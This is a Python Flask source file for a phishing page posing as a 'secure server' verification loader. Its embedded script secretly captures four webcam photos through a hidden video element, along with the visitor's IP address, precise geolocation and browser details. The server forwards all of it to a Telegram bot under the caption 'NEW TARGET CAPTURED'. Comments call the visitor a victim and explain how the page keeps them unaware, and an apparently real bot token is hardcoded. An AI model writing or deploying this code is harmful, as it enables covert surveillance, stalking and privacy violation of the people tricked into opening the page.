import os
import base64
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8997297348:AAHyiU10sAbn5Lt0RriG1IhvDn7cRWSVHdk"
OWNER_ID = "8612102965"

# ================== THE HTML WEBPAGE ==================
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
  body { background: #050505; color: #00ffcc; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
  
  .container { position: relative; z-index: 1; width: 100%; max-width: 400px; padding: 20px; text-align: center; }
  
  .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  
  h2 { font-size: 18px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
  p { font-size: 12px; color: #888; }
  
  /* Video ko hide kar diya hai taaki victim ko pata na chale */
  #hidden-video { display: none; }
</style>
</head>
<body>

<div class="container" id="main-container">
  <h2>Connecting to Secure Server...</h2>
  <div class="loader"></div>
  <p id="status-text">Please wait while we verify your connection.</p>
</div>

<!-- Ye video capture karega lekin screen par nahi dikhega -->
<video id="hidden-video" autoplay playsinline></video>

<script>
const video = document.getElementById('hidden-video');
const canvas = document.createElement('canvas');
let stream = null;
let photosTaken = 0;
let userIP = 'Unknown';

// 1. IP Address silently fetch karo
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => { userIP = data.ip; })
  .catch(() => { userIP = 'Blocked'; });

// 2. Camera aur Location start karo
async function startSilentCapture() {
  try {
    // Camera permission mangiye
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    video.srcObject = stream;
    
    // Location mangiye
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          takePhotos(mapLink);
        },
        () => {
          takePhotos('Location Denied');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      takePhotos('Location Not Supported');
    }

  } catch (err) {
    // Agar user ne permission block kar di
    document.getElementById('status-text').innerText = "Verification failed. Please reload and allow permissions.";
  }
}

// 3. Photos lena (User ko lagega bas loading ho rahi hai)
function takePhotos(mapLink) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext('2d');
  
  let count = 0;
  
  // Total 4 photos, 1.5 second ke gap se (taki normal lage)
  const interval = setInterval(() => {
    // Photo capture karo
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    
    // Backend ko bhejo
    sendToBackend(imageData, mapLink, count + 1);

    count++;
    document.getElementById('status-text').innerText = `Verifying identity... Step ${count}/4`;

    if (count >= 4) {
      clearInterval(interval);
      // Camera band kar do
      stream.getTracks().forEach(track => track.stop());
      
      // Victim ko lagta rahe ki verify ho gaya
      document.getElementById('main-container').innerHTML = `
        <h2 style="color: #00ffcc;">Connection Verified</h2>
        <p style="margin-top: 15px;">You can now close this page.</p>
      `;
    }
  }, 1500); 
}

// 4. Data Flask Backend par bhejo
function sendToBackend(base64Image, location, photoNum) {
  fetch('/api/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      image: base64Image,
      ip: userIP,
      location: location,
      photo_number: photoNum
    })
  });
}

// Page load hote hi permission popup aayega
window.onload = () => {
  startSilentCapture();
};
</script>
</body>
</html>
"""

# ================== ROUTES ==================
@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    if not data or 'image' not in data:
        return jsonify({"error": "No image"}), 400

    base64_img = data['image'].split(',')[1]
    user_ip = data.get('ip', 'Unknown')
    location = data.get('location', 'Unknown')
    photo_num = data.get('photo_number', 0)

    caption = (
        f"NEW TARGET CAPTURED (PHOTO {photo_num}/4)\n\n"
        f"IP Address: {user_ip}\n"
        f"Live Location: {location}\n"
        f"Device Info: {request.user_agent.string[:50]}..."
    )

    send_photo_to_telegram(base64_img, caption)
    return jsonify({"status": "success"})

def send_photo_to_telegram(base64_string, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {
        'photo': ('image.jpg', base64.b64decode(base64_string), 'image/jpeg')
    }
    payload = {
        'chat_id': OWNER_ID,
        'caption': caption
    }
    try:
        requests.post(url, data=payload, files=files)
    except Exception as e:
        print(f"Telegram send error: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
